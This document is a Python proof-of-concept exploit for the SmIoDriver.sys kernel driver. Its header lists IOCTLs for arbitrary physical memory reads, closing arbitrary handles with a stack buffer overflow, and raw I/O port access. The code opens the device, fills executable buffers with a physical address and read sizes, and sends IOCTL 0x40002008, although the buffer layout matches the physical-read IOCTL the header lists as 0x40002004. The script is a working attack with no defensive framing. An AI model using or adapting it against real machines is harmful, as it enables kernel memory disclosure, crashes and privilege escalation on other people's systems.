## IOCTL 0x40002004 : Arbitrary Physical Memory Read using MmMapIoSpace
## IOCTL 0x40002008 : Close a handle of your choice! + Stack-based Buffer Overflow
## IOCTL 0x40002000 : Arbitrary RW to IO ports



import ctypes
from ctypes import wintypes
import struct


GENERIC_READ = 0x80000000
GENERIC_WRITE = 0x40000000
OPEN_EXISTING = 3
MEM_RESERVE = 0x2000
MEM_COMMIT = 0x1000
PAGE_EXECUTE_READWRITE = 0x40
INVALID_HANDLE_VALUE = -1

PhysicalMemAddr = 0xE0000
dwDataSizeToRead = 0x4
dwAmountOfDataToRead = 8
dwBytesReturned = wintypes.DWORD(0)
dwIOCTL = 0x40002008

# Define the SECURITY_ATTRIBUTES structure
class SECURITY_ATTRIBUTES(ctypes.Structure):
    _fields_ = [
        ('nLength', wintypes.DWORD),
        ('lpSecurityDescriptor', wintypes.LPVOID),
        ('bInheritHandle', wintypes.BOOL),
    ]

# Define the Windows API functions
kernel32 = ctypes.WinDLL('kernel32', use_last_error=True)

CreateFileW = kernel32.CreateFileW
CreateFileW.restype = wintypes.HANDLE
CreateFileW.argtypes = [
    wintypes.LPCWSTR,
    wintypes.DWORD,
    wintypes.DWORD,
    ctypes.POINTER(SECURITY_ATTRIBUTES),
    wintypes.DWORD,
    wintypes.DWORD,
    wintypes.HANDLE,
]

VirtualAlloc = kernel32.VirtualAlloc
VirtualAlloc.restype = wintypes.LPVOID
VirtualAlloc.argtypes = [
    wintypes.LPVOID,
    ctypes.c_size_t,
    wintypes.DWORD,
    wintypes.DWORD,
]

VirtualFree = kernel32.VirtualFree
VirtualFree.restype = wintypes.BOOL
VirtualFree.argtypes = [
    wintypes.LPVOID,
    ctypes.c_size_t,
    wintypes.DWORD,
]

DeviceIoControl = kernel32.DeviceIoControl
DeviceIoControl.restype = wintypes.BOOL
DeviceIoControl.argtypes = [
    wintypes.HANDLE,
    wintypes.DWORD,
    wintypes.LPVOID,
    wintypes.DWORD,
    wintypes.LPVOID,
    wintypes.DWORD,
    ctypes.POINTER(wintypes.DWORD),
    wintypes.LPVOID,
]

# Open a handle to the device
hDevice = CreateFileW(
    r'\\.\SmIoDriver',
    GENERIC_READ | GENERIC_WRITE,
    0,
    None,
    OPEN_EXISTING,
    0,
    None
)

if hDevice == INVALID_HANDLE_VALUE:
    print("[!] Couldn't open handle to SmIoDriver.sys driver. Error code:", ctypes.get_last_error())
    exit(-1)
print("[+] Opened a handle to SmIoDriver.sys driver!")

print("[-] Allocating buffers' memory area!")
lpInBuffer = VirtualAlloc(0x41000000, 0x100, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE)
lpOutBuffer = VirtualAlloc(0x42000000, 0x100, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE)
if not lpInBuffer or not lpOutBuffer:
    print("[!] Unable to allocate buffers' memory area. Error code:", ctypes.get_last_error())
    exit(-1)

print("[-] Populating lpInBuffer")
ctypes.memmove(lpInBuffer, struct.pack('I', PhysicalMemAddr), 4)
ctypes.memmove(lpInBuffer + 8, struct.pack('I', dwDataSizeToRead), 4)
ctypes.memmove(lpInBuffer + 12, struct.pack('I', dwAmountOfDataToRead), 4)

print(f"[-] Sending IOCTL 0x{dwIOCTL:08X}")
success = DeviceIoControl(
    hDevice,
    dwIOCTL,
    lpInBuffer,
    0x10,
    lpOutBuffer,
    0x40,
    ctypes.byref(dwBytesReturned),
    None
)
if not success:
    print(f"[!] Couldn't send IOCTL 0x{dwIOCTL:08X} Error code:", ctypes.get_last_error())
    exit(-1)

VirtualFree(lpInBuffer, 0, 0x8000)
VirtualFree(lpOutBuffer, 0, 0x8000)
kernel32.CloseHandle(hDevice)
